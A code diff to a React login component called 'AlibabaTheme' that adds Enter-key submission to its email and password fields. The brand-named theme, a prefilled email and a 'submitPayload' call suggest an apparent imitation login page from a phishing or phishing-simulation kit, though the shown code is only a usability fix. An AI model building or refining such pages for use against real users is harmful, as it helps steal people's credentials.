@@ -22,8 +22,8 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { reportViolation, submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e?: React.FormEvent) => {
-    if (e) e.preventDefault();
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
+    e.preventDefault();
     if (!agreed) {
       alert(lang === 'zh' ? '请先勾选同意协议' : 'Please agree with the policies');
       return;
@@ -37,6 +37,12 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -157,6 +163,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                         setEmail(e.target.value);
                         if (error) setError(null);
                       }}
+                      onKeyDown={handleKeyDown}
                       className="w-full px-4 py-3 border border-gray-200 rounded focus:border-blue-400 outline-none text-[14px] placeholder:text-gray-300 transition-colors"
                     />
                   </div>
@@ -169,6 +176,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                         setPassword(e.target.value);
                         if (error) setError(null);
                       }}
+                      onKeyDown={handleKeyDown}
                       className="w-full px-4 py-3 border border-gray-200 rounded focus:border-blue-400 outline-none text-[14px] placeholder:text-gray-300 transition-colors"
                     />
                     <button 
